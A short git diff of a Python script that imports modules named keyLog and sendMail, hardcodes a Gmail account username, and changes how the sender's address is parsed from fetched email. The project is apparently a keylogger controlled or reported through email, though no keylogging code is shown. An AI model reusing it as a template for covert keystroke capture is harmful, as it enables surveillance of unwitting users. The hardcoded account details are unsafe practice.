@@ -5,6 +5,7 @@ from threading import Timer
 import time 
 import keyLog
 import sendMail
+import re
 
 # Gmail account credentials
 username = "tnmhoang.lop93@gmail.com"
@@ -38,7 +39,10 @@ from_, encoding = decode_header(email_message["From"])[0]
 if isinstance(from_, bytes):
     from_ = from_.decode(encoding)
 
-sender_email = from_
+sender_email = email_message["From"]
+match = re.search(r'<([^>]+)>', sender_email)
+if match:
+    sender_email = match.group(1)
 
 # Print email details
 #if (from_ == "Tuấn Đạt"):
